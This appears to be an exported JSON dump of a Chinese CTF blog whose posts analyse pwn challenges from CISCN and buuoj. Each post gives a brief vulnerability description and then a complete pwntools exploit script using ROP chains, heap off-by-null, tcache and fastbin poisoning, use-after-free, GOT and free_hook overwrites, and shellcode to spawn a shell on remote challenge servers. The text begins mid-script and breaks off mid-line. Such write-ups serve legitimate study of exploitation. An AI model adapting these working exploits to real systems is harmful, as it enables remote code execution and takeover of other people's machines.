pwn import *    #pop eax ; ret  pop_eax = 0x0805c34b  #pop ebx ; ret  pop_ebx = 0x080481d1  #pop ecx ; pop ebx ; ret  pop_ecx = 0x080701d1  #pop edx ; ret  pop_edx = 0x080701aa  #int 0x80  int_80 = 0x08049a21    #通过系统调用来执行/bin/sh  rop = [pop_eax,0x0b,         pop_ecx,0,0,         pop_edx,0,         int_80,         u32(&#x27;/bin&#x27;),         u32(&#x27;/sh\\x00&#x27;)]    #sh = process(&#x27;./pwnh37&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,39005)  sh.recvuntil(&#x27;\\n&#x27;)  #泄露main的ebp  sh.sendline(&#x27;+360&#x27;)  #由于泄露出来是一个负数的形式，因此我们将其加上0x100000000即可  main_ebp = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True))  main_ebp = 0x100000000 + main_ebp  #获得/bin/sh字符串在栈里的位置  rop[4] = main_ebp - 0x20 + 9 * 4  print hex(main_ebp)    #开始写360处就是parse_expr的返回地址，我们写ROP  for i in range(0,len(rop)):     payload = &#x27;+&#x27; + str(361 + i)     sh.sendline(payload)     #先泄露原来的值     num = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True))     #计算出差值     offset = rop[i] - num     print hex(rop[i])     #如果小于零，我们需要去掉+号，直接使用数字前面的负号     if offset&lt;0:        payload_ = payload + str(offset)     else:        payload_ = payload + &#x27;+&#x27; + str(offset)     #发送数据     sh.sendline(payload_)     #我们还需检验一下是否正确的写入了对的数据     value = int(sh.recv(1024))     if value &lt; 0:        #转为原始数据        value += 0x100000000     while value!=rop[i]:        print &quot;current value is %x&quot; % (value)        offset = rop[i] - value        if offset&lt;0:           sh.sendline(payload + str(offset))        else:           sh.sendline(payload + &#x27;+&#x27; + str(offset))        value = int(sh.recv(1024))        if value &lt; 0:           value += 0x100000000    #getshell  sh.sendline(&#x27;a&#x27;)    sh.interactive() ","categories":["CTF"],"tags":["ROP","下标越界"]},{"title":"car_market_asis_ctf_2016","url":"/2020/07/24/car_market_asis_ctf_2016/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，程序功能比较多，这里不做分析了。\n\n\n漏洞点在这，输入函数存在off by null。\n\n\n该函数在set_customer_name里调用\n\n\n可以将comment指针的低1字节覆盖\n\n\n这样，我们只需要在对应的位置伪造好chunk，然后free掉形成overlap chunk即可控制，构造麻烦了点，为了能够通过fastbin attack申请到bss上控制堆指针，我们还需要利用count来伪造成chunk的size\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./car_market_asis_ctf_2016&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29774)elf = ELF(&#x27;./car_market_asis_ctf_2016&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)atoi_got = elf.got[&#x27;atoi&#x27;]def add_car(model,price):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;model&#x27;,model)   sh.sendlineafter(&#x27;price&#x27;,str(price))def delete_car(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index&#x27;,str(index))def show():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)def select_car(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index&#x27;,str(index))def add_customer():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)def set_model(model):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendafter(&#x27;model&#x27;,model)def set_price(price):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;price&#x27;,str(price))def set_customer_name(name):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.sendafter(&#x27;name :&#x27;,name)def set_customer_comment(comment):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)   sh.sendafter(&#x27;coment :&#x27;,comment)add_car(&#x27;a&#x27;*0x9,10) #0select_car(0)add_customer()set_customer_comment(&#x27;b&#x27;*0x40 + &#x27;\\n&#x27;)sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)#伪造一个chunkadd_car(p64(0) + p64(0x51),10) #1select_car(1)add_customer()set_customer_comment(&#x27;d&#x27;*0x40 + &#x27;\\n&#x27;)#null off by one修改堆指针指向fake_chunkset_customer_name(p64(0) + p64(0x21) + &#x27;e&#x27;*0x10)sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)for i in range(0x51-2): #使得count增加为0x51，这样可以作为fake_chunk的size   add_car(&#x27;f&#x27;*0x9,10)fake_chunk_in_bss = 0x00000000006020B8#free掉fake_chunkselect_car(1)add_customer()sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)set_price(fake_chunk_in_bss) #将bss上的fake_chunk连接上去sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)select_car(2)add_customer()#申请到bss上，控制堆指针数组，实现任意地址读写fake_struct = p64(atoi_got-0x8) + p64(0) + p64(0) + &#x27;\\n&#x27;set_customer_comment(p64(0x00000000006020D0) + fake_struct)sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)select_car(0)show()sh.recvuntil(&#x27;Model  : &#x27;)libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - libc.sym[&#x27;_IO_setvbuf&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)set_model(p64(0) + p64(system_addr)) #修改atoi的got表#getshellsh.sendlineafter(&#x27;&gt;&#x27;,&#x27;/bin/sh&#x27;)sh.interactive()","categories":["CTF"],"tags":["fastbin","off by one"]},{"title":"ciscn_2019_c_3","url":"/2020/04/30/ciscn_2019_c_3/","content":"首先，检查一下程序的保护机制\n\n\nGlibc给定版本2.27\n然后，我们用IDA分析一下\nDelete功能没有清空指针\n\n\n只能向heap_data + 0x10处开始输入数据,这意味着，chunk的fd域不能被我们修改到\n\n\nBackdoor函数可以对chunk的fd域做修改，因此，我们可以利用backdoor，将fd指向伪造的chunk处，而伪造的chunk的fd指向free_hook，这样通过三次malloc分配到free_hook改写free_hook\n\nfrom pwn import *#sh = process(&#x27;./ciscn_2019_c_3&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26426)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]one_gadget = 0x4f322def add(size,content):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendlineafter(&#x27;Give me the name:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;weapon:&#x27;,str(index))def backdoor(index):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;666&#x27;)   sh.sendlineafter(&#x27;weapon:&#x27;,str(index))#0add(0x100,&#x27;a&#x27;)#1add(0x60,&#x27;b&#x27;)for i in range(8):   delete(0)show(0)sh.recvuntil(&#x27;attack_times: &#x27;)main_arena_xx = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_sone_gadget_addr = libc_base + one_gadgetprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)#2add(0x60,&#x27;a&#x27;*0x10 + p64(free_hook_addr - 0x10))delete(2)delete(2)#修改fd+=0x20for i in range(0x20):   backdoor(2)add(0x60,&#x27;c&#x27;) #3add(0x60,&#x27;c&#x27;) #4add(0x60,p64(one_gadget_addr))#getshelldelete(1)sh.interactive()","categories":["CTF"],"tags":["UAF","glibc 2.27","free_hook"]},{"title":"ciscn_2019_en_4","url":"/2020/04/30/ciscn_2019_en_4/","content":"首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，主函数里的功能通过对应index的虚表调用，虚表存在在堆里。\n\n\nEdit功能存在下标溢出，因此可以向上溢出修改虚表指针。\n\n\nShow功能同理存在溢出，可以读取原来的虚表地址,进而计算出程序的基址。\n\n\n进而计算出堆指针存放的地址，我们将堆指针的地址-0x18作为虚表地址，这样，当我们再次调用功能1的时候，就会执行heap0。利用8字节shellcode，构造一个read系统调用来输入shellcode主体。\n\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./ciscn_2019_en_4&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29251)elf = ELF(&#x27;./ciscn_2019_en_4&#x27;)def add(size):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Money makes you stronger:&#x27;,str(size))def edit(index,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;change Weapon id:&#x27;,str(index))   sh.sendafter(&#x27;new Name:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Which Weapon do you want to show?&#x27;,str(index))add(1)#布置shellcode，最多8字节，我们构造一个read调用来输入主shellcodeshellcode = asm(&#x27;&#x27;&#x27;cdq                   xor eax,eax                   xchg rsi,rdi                   syscall                &#x27;&#x27;&#x27;)edit(0,shellcode)show(-1)sh.recvuntil(&#x27;Weapon name is:&#x27;)elf_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x203DB8heap_ptr_addr = elf_base + 0x204088print &#x27;elf_base=&#x27;,hex(elf_base)print &#x27;heap_ptr_addr=&#x27;,hex(heap_ptr_addr)#修改虚表edit(-1,p64(heap_ptr_addr - 0x18))#触发前面布置的shellcodesh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)#发送主shellcodesleep(1)payload = &#x27;a&#x27;*0x14 + asm(shellcraft.sh())sh.send(payload)sh.interactive()","categories":["CTF"],"tags":["shellcode","下标越界"]},{"title":"ciscn_2019_en_5(last_reminder在单纯的堆null off by one里的妙用+shrink unsorted bin)","url":"/2020/07/25/ciscn_2019_en_5/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们在IDA里分析一下，在add函数里，存在一个null off by one漏洞。\n\n\n在delete里，会先清空内容，再free\n\n\n输入函数遇0截断，并且也存在null off by one。\n\n\n从上述来分析，我们无法同时构造好prev_size和size，因为遇到0就截断了，并且，由于delete时清空了内容，因此也无法利用分步的方法来构造好prev_size。由此，可以使用shrink unsorted bin的方法。问题又来了，当我们shrink unsorted bin后，想要成功从unsorted bin里切割，需要将unsorted bin尾部多余的部位伪造成一个chunk，但是在这里没法实现，因为在free之前。内容已经清空。通过阅读glibc的源码，进一步加深了理解。Malloc的时候，首先尝试查找fastbin，不成功，则查找unsorted bin，如果这个unsorted bin和last_reminder一样，那么就直接从last_rminder里切割，并且切割的时候不会坚检查;否则，则将unsorted bin里的chunk放入对应的bin里面，然后从bin里面拿chunk切割，如果是在bin里面拿chunk切割的话，则会进行unlink，而unlink是会检查下一个chunk的。最后，如果从bin里切割成功，则剩余的部分放入unsorted bin，同时last_reminder也指向这个剩余部分，那么第二次切割时，就可以直接从last_reminder里切割。\n\n\n综上，我们先构造出一块unsorted bin，然后从unsorted bin里切割一个堆，并且利用这个堆来进行shrink 剩余的部分，这样last_reminder被初始化，以后的切割就不会检查这个unsorted bin下一个chunk的头，直接从last_reminder里切割，由此绕过了unlink。\n那么，就比较简单了。\n#coding:utf8from pwn import *#sh = process(&#x27;./ciscn_2019_en_5&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28082)libc = ELF(&#x27;./libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]sh.sendlineafter(&#x27;name&gt;&#x27;,&#x27;/bin/sh&#x27;)def add(size,content):   sh.sendlineafter(&#x27;choice&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;length&gt;&#x27;,str(size - 0xF))   sh.sendlineafter(&#x27;content&gt;&#x27;,content)def show(index):   sh.sendlineafter(&#x27;choice&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index&gt;&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;choice&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index&gt;&#x27;,str(index))add(0x110,&#x27;a&#x27;*0x10) #0add(0x110,&#x27;b&#x27;*0x10) #1add(0x110,&#x27;c&#x27;*0x10) #2add(0x110,&#x27;d&#x27;*0x10) #3#填满tcache binfor i in range(4,11):   add(0x110,&#x27;d&#x27;*0x10)for i in range(4,11):   delete(i)#0、1、2合并为unsorted bindelete(0)delete(1)delete(2)#null off by one shrink unsorted bin，同时，last_reminder被初始化#last_reminder被初始化后，下一次就从last_reminder切割，不会对next chunk进行合法检查#因此就可以绕过不能伪造尾部chunk的限制了add(0x28,&#x27;a&#x27;*0x10) #0add(0x1F0,&#x27;a&#x27;*0x10) #1add(0xF0,&#x27;b&#x27;*0x10) #2#填满tcache binfor i in range(4,11):   add(0x1F0,&#x27;d&#x27;*0x10)for i in range(4,11):   delete(i)#形成overlap chunkdelete(1)delete(3)add(0xF0,&#x27;a&#x27;*0x10) #1add(0xF0,&#x27;a&#x27;*0x10) #3show(2)sh.recv(1)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_ssystem_addr = libc_base + libc.sym[&#x27;system&#x27;]free_hook_addr = libc_base + free_hook_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)add(0xF0,&#x27;b&#x27;*0x10) #4#double freedelete(2)delete(4)add(0xF0,p64(free_hook_addr)) #1add(0xF0,&#x27;a&#x27;) #2add(0xF0,p64(system_addr)) #3#getshellsh.sendlineafter(&#x27;choice&gt;&#x27;,&#x27;4&#x27;)sh.sendlineafter(&#x27;remarks&gt;&#x27;,&#x27;haivk&#x27;)sh.interactive()","categories":["CTF"],"tags":["unsorted bin","off by one","堆风水","last_reminder"]},{"title":"ciscn_2019_es_3(top chunk形成unsorted bin+expand unsorted bin)","url":"/2020/07/25/ciscn_2019_es_3/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在edit功能里，使用strlen来更新size，因此下一次修改，可以溢出到下一个chunk的size处。\n\n\n程序中没有调用free函数，并且不能完全控制chunk的size的8字节，无法利用house of force，因此，想到了house of orange的方法。\n\n\n利用edit和溢出，修改将TOP chunk的size改小，然后申请一个比size大的堆，old_topchunk就会被放入unsorted bin。这个top chunk的size不能随意修改，得大于最小值，并且要求(top_chunk_addr + size) &amp; 0xFFF &#x3D; 0，即大小是页对齐的。\n首先利用这个方法，得到unsorted bin，泄露地址。\nadd(0x15000,&#x27;a&#x27;*0x18) #0#raw_input()show_name()sh.recvuntil(&#x27;a&#x27;*0x40)heap_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(0x8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)heap_ptr_addr = 0x0000000000602100sh.sendlineafter(&#x27;(yes:1 / no:0)&#x27;,&#x27;0&#x27;)add(0x18,&#x27;b&#x27;*0x18) #1edit(1,&#x27;b&#x27;*0x18)edit(1,&#x27;b&#x27;*0x18 + &#x27;\\x71\\x0D\\x00&#x27;) #修改TOP chunk的size，size要求(top_chunk_addr + size) &amp; 0xFFF = 0#将top chunk放入unsorted binadd(0x1008,&#x27;c&#x27;*0x100) #2add(0xC00,&#x27;\\xA0&#x27;) #3show(3)\n\n第1个chunk，之所以add(0x15000,’a’0x18)，是为了让old_topchunk的地址靠近将来新的top chunk，要形成overlap chunk，这里的方法是*[expand unsorted bin，即扩充unsorted bin]{.mark}**，而我们只能控制size的前3字节，为了能在3字节范围内将old_topchunk形成的unsorted bin尾部扩充到我们可控的区域内，我们的事先消耗掉old_topchunk里大部分空间。这样，我们将来在new_topchunk里切割的堆块就被包含在了unsorted bin里面。\nadd(0x18,&#x27;e&#x27;*0x18) #4edit(4,&#x27;e&#x27;*0x18)#扩充unsorted binedit(4,&#x27;e&#x27;*0x18 + p16(0xA180))edit(2,&#x27;c&#x27;*0x30 + p64(0xA180) + p64(0x20) + &#x27;c&#x27;*0x10 + p64(0) + p64(0x21) + &#x27;c&#x27;*0x10) #伪造好扩充的unsorted bin#申请后，就可以通过2来控制unsorted binadd(0xA140,&#x27;f&#x27;*0x20) #5\n\n现在，我们就通过2来控制整个unsorted bin，由于在libc-2.27上，传统的house of orange已经失效了，但是可以有其他方法来触发，比如exit。\n\n\n但是这里，我使用的是另外一种方法，即控制unsorted bin的bk指针指向bss上的name\n\n\n然后我们在name里伪造一个chunk，另该chunk的fd &#x3D; bk &#x3D; name，然后，通过malloc与伪造的chunksize一样的堆，unsorted bin遍历时，就可以直接将name取出返回给我们，这样，我们就可以控制name下面的堆指针，进而获得任意地址读写的能力。\n\n\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./ciscn_2019_es_3&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29422)elf = ELF(&#x27;./ciscn_2019_es_3&#x27;)atol_got = elf.got[&#x27;atol&#x27;]libc = ELF(&#x27;./libc-2.27.so&#x27;)name_addr = 0x00000000006020C0sh.sendafter(&#x27;name :&#x27;,&#x27;a&#x27;*0x40)def add(size,content):   sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size of page :&#x27;,str(size))   sh.sendafter(&#x27;Content :&#x27;,content)def show(index):   sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index of page :&#x27;,str(index))def edit(index,content):   sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index of page :&#x27;,str(index))   sh.sendafter(&#x27;Content:&#x27;,content)def show_name():   sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;4&#x27;)add(0x15000,&#x27;a&#x27;*0x18) #0#raw_input()show_name()sh.recvuntil(&#x27;a&#x27;*0x40)heap_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(0x8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)heap_ptr_addr = 0x0000000000602100sh.sendlineafter(&#x27;(yes:1 / no:0)&#x27;,&#x27;0&#x27;)add(0x18,&#x27;b&#x27;*0x18) #1edit(1,&#x27;b&#x27;*0x18)edit(1,&#x27;b&#x27;*0x18 + &#x27;\\x71\\x0D\\x00&#x27;) #修改TOP chunk的size，size要求(top_chunk_addr + size) &amp; 0xFFF = 0#将top chunk放入unsorted binadd(0x1008,&#x27;c&#x27;*0x100) #2add(0xC00,&#x27;\\xA0&#x27;) #3show(3)sh.recvuntil(&#x27;Content :\\n&#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = main_arena_xx - 0x3ec2a0system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)add(0x18,&#x27;e&#x27;*0x18) #4edit(4,&#x27;e&#x27;*0x18)#扩充unsorted binedit(4,&#x27;e&#x27;*0x18 + p16(0xA180))edit(2,&#x27;c&#x27;*0x30 + p64(0xA180) + p64(0x20) + &#x27;c&#x27;*0x10 + p64(0) + p64(0x21) + &#x27;c&#x27;*0x10) #伪造好扩充的unsorted bin#申请后，就可以通过2来控制unsorted binadd(0xA140,&#x27;f&#x27;*0x20) #5edit(2,p64(0) + p64(0x31) + p64(0) + p64(name_addr)) #将name连接到unsorted bin的bk上show_name()sh.sendlineafter(&#x27;(yes:1 / no:0)&#x27;,&#x27;1&#x27;)#在bss上伪造一个chunksh.sendlineafter(&#x27;name :&#x27;,p64(0) + p64(0x91) + p64(name_addr)*2) #unsorted bin双向链表完整性检查，我们令fd=bk=self#申请到name里，修改堆指针payload = &#x27;a&#x27;*0x30 + p64(atol_got)add(0x80,payload) #6#修改atol的got表edit(0,p64(system_addr))#getshellsh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;/bin/sh&#x27;)sh.interactive()","categories":["CTF"],"tags":["unsorted bin","堆溢出","top chunk","glibc 2.27","堆风水","无free函数"]},{"title":"ciscn_2019_es_5(realloc(ptr,0)会free掉ptr并返回0)","url":"/2020/04/30/ciscn_2019_es_5/","content":"首先，检查一下的保护机制\n\n\n然后，我们用IDA分析一下\nCreate的时候，没有检查size，因此size可以为0\n\n\nEdit的时候，调用了realloc，并且没有检查size是否为0，如果为0，则这个chunk会被free掉，但是堆指针没有从flist堆数组里移除，这就造成了UAF。\n\n#coding:utf8from pwn import *#sh = process(&#x27;./ciscn_2019_es_5&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25051)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget_s = 0x10a38cdef add(size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size?&gt;&#x27;,str(size))   sh.sendafter(&#x27;content:&#x27;,content)def edit(index,content,have_content = True):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   if have_content:      sh.sendafter(&#x27;New content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))#0add(0x100,&#x27;a&#x27;)for i in range(7):   add(0x100,&#x27;b&#x27;)for i in range(1,8):   delete(i)#得到unsorted bindelete(0)add(0x30,&#x27;a&#x27;)#泄露地址show(0)sh.recvuntil(&#x27;Content: &#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sone_gadget_addr = libc_base + one_gadget_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)add(0,&#x27;&#x27;) #1#realloc释放chunk后，程序没有清空指针，因此，我们再delete一次，就实现了double freeedit(1,&#x27;&#x27;,False)delete(1)add(0x10,p64(malloc_hook_addr))#写malloc_hookadd(0x10,p64(one_gadget_addr))#getshellsh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)sh.interactive()","categories":["CTF"],"tags":["UAF","realloc"]},{"title":"ciscn_2019_ne_3(ROP长度过小技巧)","url":"/2020/04/30/ciscn_2019_ne_3/","content":"首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，32位栈溢出，难点在于结束变更了两次esp，因此，我们单纯的溢出，直接会造成esp变更到一个无效的地址处。\n\n\n因此，我们需要将将ecx覆盖为bss段，将栈切换到bss上进行rop。但是切换到bss之前，需要先在bss段布置好rop才行。由此，程序一开始处，叫我们输入长度时，能够输入16字节，并且数据保存在bss段，16字节，前4字节，我们用来存储长度值-1，然后，我们可以布置下3条rop gadget。\n\n\n3条gadgets，单纯的read调用完成不了，我们可以ret2text，调用text里的read。\n\n\n至于读取数据到哪里，这是关键，我们要**[利用read来劫持read自己的返回地址。]{.mark}**这样，read结束后就不会返回到text后面执行，而是进入劫持后的流。\npayload = &#x27;-1\\n\\x00&#x27; + p32(text_read) + p32(bss) + p32(0x100)sh.sendafter(&#x27;length of password:&#x27;,payload)#栈迁移到bss上payload = &#x27;a&#x27;*0x48 + p32(bss + 8)sh.sendlineafter(&#x27;:&#x27;,payload)\n\n\n\n如图，我们利用read，向read函数自身的返回地址输入数据，这样就可以劫持read返回到后续输入的rop里。后续rop里，我们要继续做一个栈迁移，因为要调用puts等函数，需要开辟较大的栈空间，因此，我们需要将栈向后迁移0x600。\n#coding:utf8from pwn import *sh = process(&#x27;./ciscn_2019_ne_3&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,25625)elf = ELF(&#x27;./ciscn_2019_ne_3&#x27;)libc = ELF(&#x27;/lib32/libc-2.27.so&#x27;)read_plt = elf.plt[&#x27;read&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_ebp = 0x0804881bpop_3 = 0x08048819leave_ret = 0x08048575bss = 0x0804A060text_read = 0x080486D0sh.sendlineafter(&#x27;:&#x27;,&#x27;haivk&#x27;)#通过劫持read的返回的地址，来达到进一步的利用payload = &#x27;-1\\n\\x00&#x27; + p32(text_read) + p32(bss) + p32(0x100)sh.sendafter(&#x27;length of password:&#x27;,payload)#栈迁移到bss上payload = &#x27;a&#x27;*0x48 + p32(bss + 8)#raw_input()sh.sendlineafter(&#x27;:&#x27;,payload)#raw_input()rop = p32(pop_ebp) + p32(bss + 0x600 - 4) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss + 0x600) + p32(0x100)sh.sendafter(&#x27;well, please contiune\\n&#x27;,rop)#调用puts后，继续调用read输入后续roprop2 = p32(puts_plt) + p32(pop_ebp) + p32(puts_got) + p32(read_plt) + p32(pop_3) + p32(0) + p32(bss + 0x600 + 0x20) + p32(0x100)sleep(0.5)#raw_input()sh.send(rop2)puts_addr = u32(sh.recv(4))libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;binsh_addr=&#x27;,hex(binsh_addr)rop3 = p32(system_addr) + p32(0) + p32(binsh_addr)sh.send(rop3)sh.interactive()","categories":["CTF"],"tags":["ROP","栈迁移"]},{"title":"ciscn_2019_ne_6(指针未初始化漏洞)","url":"/2020/06/11/ciscn_2019_ne_6/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在delete功能里，ptr指针存在未初始化的漏洞，因此其ptr的值可以通过其他函数来控制，造成任意地址free。\n\n\n我们可以利用check函数来控制ptr未初始化之前的值\n\n\n然后构造double free，劫持free_hook即可。\n#coding:utf8from pwn import *#sh = process(&#x27;./ciscn_2019_ne_6&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26888)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]def show():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)def add(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;passwd:&#x27;,&#x27;a&#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;Content:&#x27;,content)def edit(index,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;passwd:&#x27;,&#x27;a&#x27;)   sh.sendafter(&#x27;Content:&#x27;,content)def delete(index,passwd = &#x27;a&#x27;):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendafter(&#x27;passwd:&#x27;,passwd.ljust(0x28,&#x27;\\x00&#x27;))   sh.sendlineafter(&#x27;index:&#x27;,str(index))add(0x420,&#x27;a\\n&#x27;) #0add(0x80,&#x27;a&#x27;*0x80) #1add(0x80,&#x27;b&#x27;*0x80) #2delete(0)add(0x420,&#x27;\\n&#x27;) #0show()sh.recvuntil(&#x27;0: &#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print 